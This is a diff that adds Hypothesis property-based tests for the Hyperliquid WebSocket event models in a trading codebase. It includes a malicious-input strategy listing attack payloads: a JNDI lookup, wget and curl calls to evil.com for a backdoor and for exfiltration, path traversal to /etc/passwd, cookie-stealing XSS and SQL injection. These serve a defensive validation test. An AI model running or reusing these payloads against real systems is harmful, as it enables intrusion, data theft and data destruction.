@@ -1,12 +1,29 @@
-"""Unit tests for Hyperliquid raw WebSocket event models.
+"""Property-based tests for Hyperliquid raw WebSocket event models.
 
-Tests validation and processing of WebSocket events from the Hyperliquid exchange API
-including real-time order book updates, trade events, and user state changes.
+These tests validate critical security boundary models that process external WebSocket event data.
+The models tested here are essential for real-time trading, order book updates, trade events, and user state changes.
+
+SECURITY CRITICAL: These raw models protect against:
+- Malicious WebSocket event data that could manipulate real-time trading decisions
+- Buffer overflow attacks through oversized event structures
+- Injection attacks through malformed event data and user addresses
+- Type confusion that could bypass event validation
+- Timestamp manipulation that could affect event ordering
+- Hash manipulation that could affect event integrity
+- Financial precision errors in real-time price and size data
+- Order ID manipulation that could affect order tracking
+- Boolean manipulation that could affect maker/taker status
+
+Property testing ensures comprehensive coverage of WebSocket event edge cases and adversarial inputs.
 """
 
 from datetime import UTC, datetime
+from decimal import Decimal
+from typing import Any
 
 import pytest
+from hypothesis import given, strategies as st, assume
+from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.hyperliquid.models.hl_raw_orderbook import HyperliquidRawBookLevel
@@ -21,6 +38,891 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_ws_events import (
 from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 from tests.fixtures.time_fixtures import FreezerProtocol
+
+
+# =============================================================================
+# HYPOTHESIS STRATEGIES FOR WEBSOCKET EVENTS MODEL TESTING
+# =============================================================================
+
+
+def valid_coin_symbol_strategy() -> SearchStrategy[str]:
+    """Generate valid coin symbols for WebSocket events."""
+    return st.one_of([
+        # Known trading pairs
+        st.sampled_from([
+            "BTC",
+            "ETH",
+            "SOL",
+            "AVAX",
+            "DOGE",
+            "USDC",
+            "USDT",
+            "ARB",
+            "OP",
+            "MATIC",
+            "ATOM",
+            "NEAR",
+            "FTM",
+            "ADA",
+            "DOT",
+            "UNI",
+            "LINK",
+            "AAVE",
+            "CRV",
+            "SUSHI",
+            "1INCH",
+        ]),
+        # Generated symbols
+        st.text(min_size=1, max_size=10, alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"),
+    ])
+
+
+def valid_side_strategy() -> SearchStrategy[str]:
+    """Generate valid trading sides."""
+    return st.sampled_from(["A", "B"])  # A = Ask (Sell), B = Bid (Buy)
+
+
+def invalid_side_strategy() -> SearchStrategy[str]:
+    """Generate invalid trading sides."""
+    return st.one_of([
+        st.sampled_from(["a", "b", "ask", "bid", "sell", "buy", "S", "X", "0", "1"]),
+        st.text(min_size=1, max_size=20).filter(lambda x: x not in ["A", "B"]),
+        st.just(""),
+        st.just("   "),
+    ])
+
+
+def financial_decimal_string_strategy() -> SearchStrategy[str]:
+    """Generate valid decimal strings for financial amounts."""
+    return st.one_of([
+        # Common trading values
+        st.decimals(
+            min_value=Decimal("0.00000001"),
+            max_value=Decimal("1000000"),
+            places=8,
+            allow_nan=False,
+            allow_infinity=False,
+        ).map(str),
+        # Specific test values
+        st.just("0.0"),
+        st.just("0.1"),
+        st.just("1.0"),
+        st.just("100.0"),
+        st.just("1000.0"),
+        st.just("30000.0"),
+        st.just("0.00000001"),  # Minimum precision
+        # Scientific notation
+        st.just("1e6"),
+        st.just("1.5e3"),
+        st.just("2.5e-4"),
+    ])
+
+
+def invalid_decimal_string_strategy() -> SearchStrategy[str]:
+    """Generate invalid decimal strings."""
+    return st.one_of([
+        # Non-finite values
+        st.just("NaN"),
+        st.just("inf"),
+        st.just("-inf"),
+        st.just("Infinity"),
+        st.just("-Infinity"),
+        # Invalid decimal formats
+        st.just("1..0"),
+        st.just("not-a-decimal"),
+        st.just(""),
+        st.just("   "),
+    ])
+
+
+def valid_ethereum_address_strategy() -> SearchStrategy[str]:
+    """Generate valid Ethereum addresses."""
+    return st.one_of([
+        # Known valid addresses
+        st.sampled_from([
+            "0x1234567890abcdef1234567890abcdef12345678",
+            "0xabcdef1234567890abcdef1234567890abcdef12",
+            "0x742d35cc6aB26c94C2cF04E1b1F4c2eD2bF4D1C3",
+            "0x0000000000000000000000000000000000000000",  # Zero address
+        ]),
+        # Generated valid addresses
+        st.builds(
+            lambda hex_part: f"0x{hex_part}",
+            st.text(min_size=40, max_size=40, alphabet="0123456789abcdefABCDEF"),
+        ),
+    ])
+
+
+def valid_cloid_strategy() -> SearchStrategy[str]:
+    """Generate valid client order IDs (128-bit hex strings)."""
+    return st.one_of([
+        # Known valid CLOIDs
+        st.sampled_from([
+            "0x" + "0" * 30 + "7b",
+            "0x" + "a" * 32,
+            "0x" + "1" * 32,
+            "0x" + "f" * 32,
+        ]),
+        # Generated valid CLOIDs (128-bit = 32 hex chars)
+        st.builds(
+            lambda hex_part: f"0x{hex_part}",
+            st.text(min_size=32, max_size=32, alphabet="0123456789abcdefABCDEF"),
+        ),
+    ])
+
+
+def invalid_cloid_strategy() -> SearchStrategy[str]:
+    """Generate invalid client order IDs."""
+    return st.one_of([
+        # Wrong length
+        st.text(min_size=1, max_size=31, alphabet="0123456789abcdefABCDEF"),
+        st.text(min_size=33, max_size=100, alphabet="0123456789abcdefABCDEF"),
+        # Missing 0x prefix
+        st.text(min_size=32, max_size=32, alphabet="0123456789abcdefABCDEF"),
+        # Invalid characters
+        st.builds(
+            lambda hex_part: f"0x{hex_part}",
+            st.text(
+                min_size=32,
+                max_size=32,
+                alphabet="ghijklmnopqrstuvwxyzGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()",
+            ),
+        ),
+        st.just(""),
+        st.just("0x"),
+        st.just("short"),
+    ])
+
+
+def valid_timestamp_strategy() -> SearchStrategy[int]:
+    """Generate valid timestamps (milliseconds since epoch)."""
+    return st.integers(
+        min_value=1000000000000,  # 2001-09-09
+        max_value=2000000000000,  # 2033-05-18
+    )
+
+
+def invalid_timestamp_strategy() -> SearchStrategy[int]:
+    """Generate invalid timestamps."""
+    return st.one_of([
+        st.integers(min_value=-1000000, max_value=-1),  # Negative timestamps
+        st.integers(min_value=0, max_value=999999999),  # Too small (seconds, not milliseconds)
+        st.integers(min_value=9999999999999, max_value=99999999999999),  # Too large
+    ])
+
+
+def valid_hash_strategy() -> SearchStrategy[str]:
+    """Generate valid hash strings."""
+    return st.one_of([
+        st.text(min_size=1, max_size=64, alphabet="0123456789abcdefABCDEF"),
+        st.just("abc123"),
+        st.just("deadbeef"),
+        st.just("0123456789abcdef"),
+    ])
+
+
+def valid_order_id_strategy() -> SearchStrategy[int]:
+    """Generate valid order IDs."""
+    return st.integers(min_value=1, max_value=9999999999)
+
+
+def valid_trade_id_strategy() -> SearchStrategy[int]:
+    """Generate valid trade IDs."""
+    return st.integers(min_value=1, max_value=9999999999)
+
+
+@st.composite
+def valid_book_level_strategy(draw) -> dict[str, Any]:
+    """Generate valid order book level data."""
+    return {
+        "px": draw(financial_decimal_string_strategy()),
+        "sz": draw(financial_decimal_string_strategy()),
+        "n": draw(st.integers(min_value=1, max_value=1000)),
+    }
+
+
+@st.composite
+def valid_book_levels_strategy(draw) -> list[list[dict[str, Any]]]:
+    """Generate valid book levels (bids and asks)."""
+    bids = draw(st.lists(valid_book_level_strategy(), min_size=0, max_size=10))
+    asks = draw(st.lists(valid_book_level_strategy(), min_size=0, max_size=10))
+    return [bids, asks]
+
+
+@st.composite
+def valid_position_info_strategy(draw) -> dict[str, Any]:
+    """Generate valid position info data."""
+    return {
+        "coin": draw(valid_coin_symbol_strategy()),
+        "entryPx": draw(st.one_of([financial_decimal_string_strategy(), st.none()])),
+        "leverage": {
+            "type": draw(st.sampled_from(["cross", "isolated"])),
+            "value": draw(st.integers(min_value=1, max_value=100)),
+        },
+        "liquidationPx": draw(st.one_of([financial_decimal_string_strategy(), st.none()])),
+        "marginUsed": draw(financial_decimal_string_strategy()),
+        "maxLeverage": draw(st.integers(min_value=1, max_value=100)),
+        "positionValue": draw(financial_decimal_string_strategy()),
+        "returnOnEquity": draw(financial_decimal_string_strategy()),
+        "szi": draw(financial_decimal_string_strategy()),
+        "unrealizedPnl": draw(financial_decimal_string_strategy()),
+    }
+
+
+@st.composite
+def valid_fill_event_strategy(draw) -> dict[str, Any]:
+    """Generate valid WebSocket fill event data."""
+    return {
+        "coin": draw(valid_coin_symbol_strategy()),
+        "px": draw(financial_decimal_string_strategy()),
+        "sz": draw(financial_decimal_string_strategy()),
+        "side": draw(valid_side_strategy()),
+        "time": draw(valid_timestamp_strategy()),
+        "hash": draw(valid_hash_strategy()),
+        "oid": draw(valid_order_id_strategy()),
+        "cloid": draw(st.one_of([valid_cloid_strategy(), st.none()])),
+        "isMaker": draw(st.booleans()),
+    }
+
+
+@st.composite
+def valid_book_update_strategy(draw) -> dict[str, Any]:
+    """Generate valid WebSocket book update data."""
+    return {
+        "coin": draw(valid_coin_symbol_strategy()),
+        "levels": draw(valid_book_levels_strategy()),
+        "time": draw(valid_timestamp_strategy()),
+    }
+
+
+@st.composite
+def valid_trade_event_strategy(draw) -> dict[str, Any]:
+    """Generate valid WebSocket trade event data."""
+    return {
+        "coin": draw(valid_coin_symbol_strategy()),
+        "px": draw(financial_decimal_string_strategy()),
+        "sz": draw(financial_decimal_string_strategy()),
+        "side": draw(valid_side_strategy()),
+        "time": draw(valid_timestamp_strategy()),
+        "hash": draw(valid_hash_strategy()),
+        "tid": draw(valid_trade_id_strategy()),
+        "users": draw(st.lists(valid_ethereum_address_strategy(), min_size=1, max_size=5)),
+    }
+
+
+@st.composite
+def valid_order_update_strategy(draw) -> dict[str, Any]:
+    """Generate valid WebSocket order update data."""
+    return {
+        "eventType": draw(st.text(min_size=1, max_size=50)),
+        "data": draw(
+            st.dictionaries(
+                st.text(min_size=1, max_size=20),
+                st.one_of([st.text(), st.integers(), st.booleans()]),
+                min_size=1,
+                max_size=10,
+            )
+        ),
+    }
+
+
+@st.composite
+def valid_position_update_event_strategy(draw) -> dict[str, Any]:
+    """Generate valid WebSocket position update event data."""
+    return {
+        "asset": draw(valid_coin_symbol_strategy()),
+        "position": draw(valid_position_info_strategy()),
+        "time": draw(valid_timestamp_strategy()),
+    }
+
+
+def malicious_ws_events_strategy() -> SearchStrategy[Any]:
+    """Generate malicious values for WebSocket events security testing."""
+    return st.one_of([
+        # WebSocket event manipulation attempts
+        st.just("${jndi:ldap://evil.com/steal-ws-events}"),
+        st.just("../../etc/passwd"),  # Path traversal
+        # XSS attempts
+        st.just("<script>alert('ws-event-xss')</script>"),
+        st.just("<img src=x onerror=alert(document.cookie)>"),
+        # SQL injection attempts
+        st.just("'; DROP TABLE trades;--"),
+        st.just("1' UNION SELECT * FROM orders--"),
+        # Buffer overflow attempts
+        st.text(min_size=1000, max_size=1500),
+        st.just("W" * 10000),
+        # Unicode attacks
+        st.just("\udce2\udc28\udc00"),  # Lone surrogates
+        st.just("\x00\x01\x02"),  # Control characters
+        # Format string attacks
+        st.just("%s%s%s%s%n"),
+        st.just("%x%x%x%x"),
+        # Command injection
+        st.just("; wget evil.com/backdoor"),
+        st.just("`curl evil.com/exfiltrate`"),
+        # NoSQL injection
+        st.just("'; return db.trades.find(); //"),
+        # JSON injection
+        st.just('{"$where": "this.px > 0"}'),
+        # Financial manipulation
+        st.just("1000.0'; UPDATE trades SET px=0;--"),
+        # Type confusion
+        st.none(),
+        st.integers(),
+        st.floats(),
+        st.booleans(),
+        st.lists(st.text()),
+        st.dictionaries(st.text(), st.text()),
+        st.binary(),
+        # WebSocket specific attacks
+        st.just("ws://evil.com/hijack"),
+        st.just("data:text/html,<script>alert(1)</script>"),
+    ])
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET FILL EVENT MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawWsFillEventProperties:
+    """Property-based tests for HyperliquidRawWsFillEvent validation and security."""
+
+    @given(fill_data=valid_fill_event_strategy())
+    def test_fill_event_validation_success_properties(self, fill_data: dict[str, Any]) -> None:
+        """Property: Valid fill event data should always create valid HyperliquidRawWsFillEvent objects."""
+        # Skip invalid data
+        try:
+            # Validate basic structure
+            assume(isinstance(fill_data["coin"], str) and fill_data["coin"].strip())
+            assume(isinstance(fill_data["side"], str) and fill_data["side"] in ["A", "B"])
+            assume(isinstance(fill_data["time"], int) and fill_data["time"] > 0)
+            assume(isinstance(fill_data["oid"], int) and fill_data["oid"] > 0)
+
+            # Validate decimal fields
+            for field in ["px", "sz"]:
+                value = fill_data[field]
+                assume(isinstance(value, str) and value.strip())
+                decimal_val = Decimal(value)
+                assume(decimal_val.is_finite() and decimal_val > 0)
+
+            # Validate optional cloid
+            if fill_data.get("cloid") is not None:
+                cloid = fill_data["cloid"]
+                assume(isinstance(cloid, str) and len(cloid) == 34)  # 0x + 32 hex chars
+                assume(cloid.startswith("0x"))
+
+        except (ValueError, TypeError, KeyError, IndexError):
+            assume(False)
+
+        obj = HyperliquidRawWsFillEvent.model_validate(fill_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawWsFillEvent)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.coin == fill_data["coin"]
+        assert isinstance(obj.px, str)
+        assert isinstance(obj.sz, str)
+        assert obj.side == fill_data["side"]
+        assert obj.time == fill_data["time"]
+        assert obj.hash == fill_data["hash"]
+        assert obj.oid == fill_data["oid"]
+        assert obj.is_maker == fill_data["isMaker"]
+
+        if fill_data.get("cloid") is not None:
+            assert obj.cloid == fill_data["cloid"]
+        else:
+            assert obj.cloid is None
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(
+        field_name=st.sampled_from(["coin", "px", "sz", "side", "hash", "cloid"]),
+        malicious_value=malicious_ws_events_strategy(),
+    )
+    def test_fill_event_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Fill event model should reject malicious inputs safely."""
+        base_data = {
+            "coin": "ETH",
+            "px": "3000.0",
+            "sz": "1.5",
+            "side": "B",
+            "time": 1640995200000,
+            "hash": "abc123",
+            "oid": 42,
+            "cloid": "0x" + "0" * 30 + "7b",
+            "isMaker": True,
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawWsFillEvent.model_validate(base_data)
+
+    @given(invalid_side=invalid_side_strategy())
+    def test_fill_event_invalid_side_properties(self, invalid_side: str) -> None:
+        """Property: Fill event should reject invalid trading sides."""
+        fill_data = {
+            "coin": "ETH",
+            "px": "3000.0",
+            "sz": "1.5",
+            "side": invalid_side,
+            "time": 1640995200000,
+            "hash": "abc123",
+            "oid": 42,
+            "isMaker": True,
+        }
+
+        # Property: Invalid sides should be rejected
+        with pytest.raises((ValidationError, EmptyStringError)):
+            HyperliquidRawWsFillEvent.model_validate(fill_data)
+
+    @given(invalid_cloid=invalid_cloid_strategy())
+    def test_fill_event_invalid_cloid_properties(self, invalid_cloid: str) -> None:
+        """Property: Fill event should reject invalid client order IDs."""
+        fill_data = {
+            "coin": "ETH",
+            "px": "3000.0",
+            "sz": "1.5",
+            "side": "B",
+            "time": 1640995200000,
+            "hash": "abc123",
+            "oid": 42,
+            "cloid": invalid_cloid,
+            "isMaker": True,
+        }
+
+        # Property: Invalid CLOIDs should be rejected
+        with pytest.raises(ValidationError):
+            HyperliquidRawWsFillEvent.model_validate(fill_data)
+
+    @given(
+        decimal_field=st.sampled_from(["px", "sz"]),
+        invalid_decimal=invalid_decimal_string_strategy(),
+    )
+    def test_fill_event_invalid_decimal_properties(
+        self, decimal_field: str, invalid_decimal: str
+    ) -> None:
+        """Property: Fill event should reject invalid decimal values."""
+        fill_data = {
+            "coin": "ETH",
+            "px": "3000.0",
+            "sz": "1.5",
+            "side": "B",
+            "time": 1640995200000,
+            "hash": "abc123",
+            "oid": 42,
+            "isMaker": True,
+        }
+        fill_data[decimal_field] = invalid_decimal
+
+        # Property: Invalid decimal values should be rejected
+        with pytest.raises((ValidationError, EmptyStringError)):
+            HyperliquidRawWsFillEvent.model_validate(fill_data)
+
+    @given(invalid_timestamp=invalid_timestamp_strategy())
+    def test_fill_event_invalid_timestamp_properties(self, invalid_timestamp: int) -> None:
+        """Property: Fill event should reject invalid timestamps."""
+        fill_data = {
+            "coin": "ETH",
+            "px": "3000.0",
+            "sz": "1.5",
+            "side": "B",
+            "time": invalid_timestamp,
+            "hash": "abc123",
+            "oid": 42,
+            "isMaker": True,
+        }
+
+        # Property: Invalid timestamps should be rejected
+        with pytest.raises(ValidationError):
+            HyperliquidRawWsFillEvent.model_validate(fill_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET BOOK UPDATE MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawWsBookUpdateProperties:
+    """Property-based tests for HyperliquidRawWsBookUpdate validation and security."""
+
+    @given(book_data=valid_book_update_strategy())
+    def test_book_update_validation_success_properties(self, book_data: dict[str, Any]) -> None:
+        """Property: Valid book update data should always create valid HyperliquidRawWsBookUpdate objects."""
+        # Skip invalid data
+        try:
+            assume(isinstance(book_data["coin"], str) and book_data["coin"].strip())
+            assume(isinstance(book_data["time"], int) and book_data["time"] > 0)
+            assume(isinstance(book_data["levels"], list) and len(book_data["levels"]) == 2)
+
+            # Validate book levels structure
+            for side_levels in book_data["levels"]:
+                assume(isinstance(side_levels, list))
+                for level in side_levels:
+                    assume(isinstance(level, dict))
+                    for field in ["px", "sz"]:
+                        if field in level:
+                            value = level[field]
+                            assume(isinstance(value, str) and value.strip())
+                            decimal_val = Decimal(value)
+                            assume(decimal_val.is_finite() and decimal_val > 0)
+
+        except (ValueError, TypeError, KeyError, IndexError):
+            assume(False)
+
+        obj = HyperliquidRawWsBookUpdate.model_validate(book_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawWsBookUpdate)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.coin == book_data["coin"]
+        assert obj.time == book_data["time"]
+        assert isinstance(obj.levels, list)
+        assert len(obj.levels) == 2
+
+    @given(
+        field_name=st.sampled_from(["coin"]),
+        malicious_value=malicious_ws_events_strategy(),
+    )
+    def test_book_update_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Book update model should reject malicious inputs safely."""
+        base_data = {
+            "coin": "BTC",
+            "levels": [[], []],
+            "time": 1640995200000,
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawWsBookUpdate.model_validate(base_data)
+
+    @given(
+        levels_structure=st.one_of([
+            st.lists(
+                st.lists(st.dictionaries(st.text(), st.text())), min_size=1, max_size=1
+            ),  # Wrong size
+            st.lists(
+                st.lists(st.dictionaries(st.text(), st.text())), min_size=3, max_size=5
+            ),  # Wrong size
+            st.just([]),  # Empty
+            st.integers(),  # Wrong type
+            st.text(),  # Wrong type
+        ])
+    )
+    def test_book_update_invalid_levels_structure_properties(self, levels_structure: Any) -> None:
+        """Property: Book update should reject invalid levels structure."""
+        book_data = {
+            "coin": "BTC",
+            "levels": levels_structure,
+            "time": 1640995200000,
+        }
+
+        # Property: Invalid levels structure should be rejected
+        with pytest.raises((ValidationError, TypeError)):
+            HyperliquidRawWsBookUpdate.model_validate(book_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET TRADE EVENT MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawWsTradeEventProperties:
+    """Property-based tests for HyperliquidRawWsTradeEvent validation and security."""
+
+    @given(trade_data=valid_trade_event_strategy())
+    def test_trade_event_validation_success_properties(self, trade_data: dict[str, Any]) -> None:
+        """Property: Valid trade event data should always create valid HyperliquidRawWsTradeEvent objects."""
+        # Skip invalid data
+        try:
+            assume(isinstance(trade_data["coin"], str) and trade_data["coin"].strip())
+            assume(isinstance(trade_data["side"], str) and trade_data["side"] in ["A", "B"])
+            assume(isinstance(trade_data["time"], int) and trade_data["time"] > 0)
+            assume(isinstance(trade_data["tid"], int) and trade_data["tid"] > 0)
+            assume(isinstance(trade_data["users"], list) and len(trade_data["users"]) > 0)
+
+            # Validate decimal fields
+            for field in ["px", "sz"]:
+                value = trade_data[field]
+                assume(isinstance(value, str) and value.strip())
+                decimal_val = Decimal(value)
+                assume(decimal_val.is_finite() and decimal_val > 0)
+
+            # Validate user addresses
+            for user in trade_data["users"]:
+                assume(isinstance(user, str) and len(user) == 42)
+                assume(user.startswith("0x"))
+
+        except (ValueError, TypeError, KeyError, IndexError):
+            assume(False)
+
+        obj = HyperliquidRawWsTradeEvent.model_validate(trade_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawWsTradeEvent)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.coin == trade_data["coin"]
+        assert isinstance(obj.px, str)
+        assert isinstance(obj.sz, str)
+        assert obj.side == trade_data["side"]
+        assert obj.time == trade_data["time"]
+        assert obj.hash == trade_data["hash"]
+        assert obj.tid == trade_data["tid"]
+        assert isinstance(obj.users, list)
+
+    @given(
+        field_name=st.sampled_from(["coin", "px", "sz", "side", "hash"]),
+        malicious_value=malicious_ws_events_strategy(),
+    )
+    def test_trade_event_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Trade event model should reject malicious inputs safely."""
+        base_data = {
+            "coin": "ETH",
+            "px": "3000.0",
+            "sz": "1.5",
+            "side": "A",
+            "time": 1640995200000,
+            "hash": "abc123",
+            "tid": 12345,
+            "users": ["0x1234567890abcdef1234567890abcdef12345678"],
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawWsTradeEvent.model_validate(base_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET ORDER UPDATE MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawWsOrderUpdateProperties:
+    """Property-based tests for HyperliquidRawWsOrderUpdate validation and security."""
+
+    @given(order_data=valid_order_update_strategy())
+    def test_order_update_validation_success_properties(self, order_data: dict[str, Any]) -> None:
+        """Property: Valid order update data should always create valid HyperliquidRawWsOrderUpdate objects."""
+        # Skip invalid data
+        try:
+            assume(isinstance(order_data["eventType"], str) and order_data["eventType"].strip())
+            assume(isinstance(order_data["data"], dict) and len(order_data["data"]) > 0)
+        except (TypeError, KeyError):
+            assume(False)
+
+        obj = HyperliquidRawWsOrderUpdate.model_validate(order_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawWsOrderUpdate)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.event_type == order_data["eventType"]
+        assert isinstance(obj.data, dict)
+
+    @given(
+        field_name=st.sampled_from(["eventType", "data"]),
+        malicious_value=malicious_ws_events_strategy(),
+    )
+    def test_order_update_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Order update model should reject malicious inputs safely."""
+        base_data = {
+            "eventType": "orderUpdate",
+            "data": {"foo": "bar"},
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawWsOrderUpdate.model_validate(base_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW WEBSOCKET POSITION UPDATE EVENT MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawWsPositionUpdateEventProperties:
+    """Property-based tests for HyperliquidRawWsPositionUpdateEvent validation and security."""
+
+    @given(position_data=valid_position_update_event_strategy())
+    def test_position_update_event_validation_success_properties(
+        self, position_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid position update data should always create valid HyperliquidRawWsPositionUpdateEvent objects."""
+        # Skip invalid data
+        try:
+            assume(isinstance(position_data["asset"], str) and position_data["asset"].strip())
+            assume(isinstance(position_data["time"], int) and position_data["time"] > 0)
+            assume(isinstance(position_data["position"], dict))
+
+            # Validate position data structure
+            position = position_data["position"]
+            assume(isinstance(position["coin"], str) and position["coin"].strip())
+            assume(isinstance(position["leverage"], dict))
+
+            # Validate decimal fields in position
+            for field in ["marginUsed", "positionValue", "returnOnEquity", "szi", "unrealizedPnl"]:
+                if field in position:
+                    value = position[field]
+                    assume(isinstance(value, str) and value.strip())
+                    decimal_val = Decimal(value)
+                    assume(decimal_val.is_finite())
+
+        except (ValueError, TypeError, KeyError, IndexError):
+            assume(False)
+
+        obj = HyperliquidRawWsPositionUpdateEvent.model_validate(position_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawWsPositionUpdateEvent)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.asset == position_data["asset"]
+        assert obj.time == position_data["time"]
+        assert isinstance(obj.position, HyperliquidRawPositionInfo)
+
+    @given(
+        field_name=st.sampled_from(["asset"]),
+        malicious_value=malicious_ws_events_strategy(),
+    )
+    def test_position_update_event_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Position update event model should reject malicious inputs safely."""
+        base_data = {
+            "asset": "ETH",
+            "position": {
+                "coin": "ETH",
+                "leverage": {"type": "cross", "value": 10},
+                "marginUsed": "100.0",
+                "maxLeverage": 50,
+                "positionValue": "150.0",
+                "returnOnEquity": "0.1",
+                "szi": "1.5",
+                "unrealizedPnl": "10.0",
+            },
+            "time": 1640995200000,
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawWsPositionUpdateEvent.model_validate(base_data)
+
+
+# =============================================================================
+# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
+# =============================================================================
+
+
+class TestHyperliquidRawWsEventsIntegrationProperties:
+    """Integration property tests for WebSocket event models working together."""
+
+    @given(
+        events=st.lists(
+            st.one_of([
+                valid_fill_event_strategy(),
+                valid_trade_event_strategy(),
+                valid_order_update_strategy(),
+            ]),
+            min_size=2,
+            max_size=5,
+        ),
+        malicious_value=malicious_ws_events_strategy(),
+    )
+    def test_ws_events_batch_processing_properties(
+        self, events: list[dict[str, Any]], malicious_value: Any
+    ) -> None:
+        """Property: Multiple WebSocket events should be processed independently."""
+        valid_events = []
+
+        for event_data in events:
+            # Try to validate each event type
+            try:
+                if "isMaker" in event_data:  # Fill event
+                    if self._is_valid_fill_event(event_data):
+                        event = HyperliquidRawWsFillEvent.model_validate(event_data)
+                        valid_events.append(event)
+                elif "tid" in event_data:  # Trade event
+                    if self._is_valid_trade_event(event_data):
+                        event = HyperliquidRawWsTradeEvent.model_validate(event_data)
+                        valid_events.append(event)
+                elif "eventType" in event_data:  # Order update
+                    if self._is_valid_order_update(event_data):
+                        event = HyperliquidRawWsOrderUpdate.model_validate(event_data)
+                        valid_events.append(event)
+            except (ValidationError, TypeError, KeyError):
+                continue
+
+        # Property: Each event should maintain its individual values
+        for event in valid_events:
+            assert hasattr(event, "model_config")
+
+        # Property: Malicious value should be rejected when injected
+        if valid_events:
+            corrupted_data = {"coin": malicious_value}
+            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+                HyperliquidRawWsFillEvent.model_validate(corrupted_data)
+
+    def _is_valid_fill_event(self, data: dict[str, Any]) -> bool:
+        """Check if data represents a valid fill event."""
+        try:
+            required_fields = ["coin", "px", "sz", "side", "time", "hash", "oid", "isMaker"]
+            if not all(field in data for field in required_fields):
+                return False
+            if data["side"] not in ["A", "B"]:
+                return False
+            if not isinstance(data["time"], int) or data["time"] <= 0:
+                return False
+            return True
+        except (TypeError, KeyError):
+            return False
+
+    def _is_valid_trade_event(self, data: dict[str, Any]) -> bool:
+        """Check if data represents a valid trade event."""
+        try:
+            required_fields = ["coin", "px", "sz", "side", "time", "hash", "tid", "users"]
+            if not all(field in data for field in required_fields):
+                return False
+            if data["side"] not in ["A", "B"]:
+                return False
+            if not isinstance(data["users"], list) or len(data["users"]) == 0:
+                return False
+            return True
+        except (TypeError, KeyError):
+            return False
+
+    def _is_valid_order_update(self, data: dict[str, Any]) -> bool:
+        """Check if data represents a valid order update."""
+        try:
+            if "eventType" not in data or "data" not in data:
+                return False
+            if not isinstance(data["data"], dict) or len(data["data"]) == 0:
+                return False
+            return True
+        except (TypeError, KeyError):
+            return False
+
+
+# =============================================================================
+# LEGACY COMPATIBILITY TESTS
+# =============================================================================
 
 
 def test_ws_fill_event_happy_path(freezer: FreezerProtocol) -> None:
